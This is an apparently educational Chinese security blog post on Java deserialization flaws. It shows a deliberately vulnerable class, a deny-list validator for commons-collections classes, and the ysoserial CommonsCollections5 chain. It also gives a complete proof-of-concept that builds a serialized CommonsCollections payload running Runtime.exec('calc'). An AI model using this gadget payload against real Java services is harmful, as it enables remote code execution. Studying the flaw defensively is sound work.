---
layout: post
title: Java deserialized vulnerability
date: 2019-9-16
categories: blog
description: 
---



## Java deserialized vulnerability

### 0x01 Java反序列化漏洞
- 序列化漏洞产生事例 
- LogFile 类可序列化存储

~~~java
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.ObjectInputStream;
import java.io.Serializable;

//Vulnerable class
public class LogFile implements Serializable {

    public String filename;
    public String filecontent;

    // Function called during deserialization

    private void readObject(ObjectInputStream in)
    {
        System.out.println("readObject from LogFile");

        try
        {
            // Unserialize data

            in.defaultReadObject();
            System.out.println("File name: " + filename + ", file content: \n" + filecontent);

            // Do something useful with the data
            // Restore LogFile, write file content to file name

            FileWriter file = new FileWriter(filename);
            BufferedWriter out = new BufferedWriter(file);

            System.out.println("Restoring log data to file...");
            out.write(filecontent);

            out.close();
            file.close();
        }
        catch (Exception e)
        {
            System.out.println("Exception: " + e.toString());
        }
    }

}
~~~
Utils 工具类，序列化与反序列化操作

~~~java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class Utils {
    // Function to serialize an object and write it to a file

    public static void SerializeToFile(Object obj, String filename)
    {
        try
        {
            FileOutputStream file = new FileOutputStream(filename);
            ObjectOutputStream out = new ObjectOutputStream(file);

            // Serialization of the object to file

            System.out.println("Serializing " + obj.toString() + " to " + filename);
            out.writeObject(obj);

            out.close();
            file.close();
        }
        catch(Exception e)
        {
            System.out.println("Exception: " + e.toString());
        }
    }

    // Function to deserialize an object from a file

    public static Object DeserializeFromFile(String filename)
    {
        Object obj = new Object();

        try
        {
            FileInputStream file = new FileInputStream(filename);
            ObjectInputStream in = new ObjectInputStream(file);

            // Deserialization of the object to file

            System.out.println("Deserializing from " + filename);
            obj = in.readObject();

            in.close();
            file.close();
        }
        catch(Exception e)
        {
            System.out.println("Exception: " + e.toString());
        }

        return obj;
    }


}

~~~

Main

```java
public class main {
    public static void main(String[] args) {

    System.out.println("Serializing...");
    LogFile ob = new LogFile();
    ob.filename = "User_Nytro.log";
    ob.filecontent = "No actoins logged";
    String file = "log.ser";
    Utils.SerializeToFile(ob,file);
    System.out.println("Deserializing...");
    LogFile obd = new LogFile();
    String filed = "log.ser";
    obd=(LogFile)Utils.DeserializeFromFile(filed);
    System.out.println("Desrializing vuln exp...");
    LogFile obv = new LogFile();
    String filev = "Exp.ser";
    obv = (LogFile)Utils.DeserializeFromFile(filev);
```

### 0x02 分析

log.ser中是正常的LogFile 序列化的内容，所以反序列后正常显示：

```bash
Serializing...
Serializing LogFile@74a14482 to log.ser
Deserializing...
Deserializing from log.ser
readObject from LogFile
File name: User_Nytro.log, file content: 
No actoins logged
Restoring log data to file...
```

而上述示例代码中最关键的部分为：

```java
ObjectOutputStream out = new ObjectOutputStream(file);
out.writeObject(obj);
```

在序列化过程中，如果被序列化的类中定义了writeObject 和 readObject 方法，虚拟机会试图调用对象类里的 writeObject 和 readObject 方法，进行用户自定义的序列化和反序列化。

所以，正常Logfile类中调用的是 private void readObject(ObjectInputStream in)(重写过了)。

而Exp.ser中调用的是BadAttributeValueExpException class 中的BadAttributeValueExpException.readObject()。

而Exp.ser所用的Gadget chain 为**ysoserial**-CommonsCollections5:

```java
Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
```

这样就实现了RCE，并且在ReadObject safe的情况。

### 0x03 结论

检查反序列化漏洞不仅要看ReadObject, 而且要看是不是本身存在这利用链，在readobject安全的情况下也要检查所用的依赖是否安全。

### 0x04 补充：反序列化的校验

```java
import java.io.*;

public class AntObjectInputStream extends ObjectInputStream {


    public AntObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }

    /**
     * 只允许反序列化SerialObject class
     * <p>
     * 在应用上使用黑白名单校验方案比较局限，因为只有使用自己定义的AntObjectInputStream类，进行反序列化才能进行校验。
     * 类似fastjson通用类的反序列化就不能校验。
     * 但是RASP是通过HOOK java/io/ObjectInputStream类的resolveClass方法，全局的检测白名单。
     */
    @Override
    protected Class<?> resolveClass(final ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
        String className = desc.getName();

        // Deserialize class name: org.joychou.security.AntObjectInputStream$MyObject
        System.out.println("Deserialize class name: " + className);

        String[] denyClasses = {"java.net.InetAddress",
                "org.apache.commons.collections.Transformer",
                "org.apache.commons.collections.functors"};

        for (String denyClass : denyClasses) {
            if (className.startsWith(denyClass)) {System.out.println("Found denyClass"); }
        }

        return super.resolveClass(desc);
    }
}

```

用AntObjectInputStream 代替ObjectInputStream可实现反序列化的校验。



## 详解Java反序列化漏洞

### 0x01 Apache-commons-collections-1

反序列化完整执行链：

![](/img/javadesrialized/acc1.png)

POC:

```Java
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.management.BadAttributeValueExpException;

public class aCC1 {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[] {
                //传入Runtime类
                new ConstantTransformer(Runtime.class),
                //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法
                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class },
                        new Object[] {"getRuntime", new Class[0] }),
                //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象
                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class },
                        new Object[] {null, new Object[0] }),
                //反射调用exec方法
                new InvokerTransformer("exec",
                        new Class[] {String.class },
                        new Object[] {"calc"})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);

        // val是私有变量，所以利用下面方法进行赋值
        Field valfield = poc.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(poc, entry);

        File f = new File("poc.txt");
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(poc);
        out.close();

    }

}

```

### 0x02 Apache-commons-collections-2

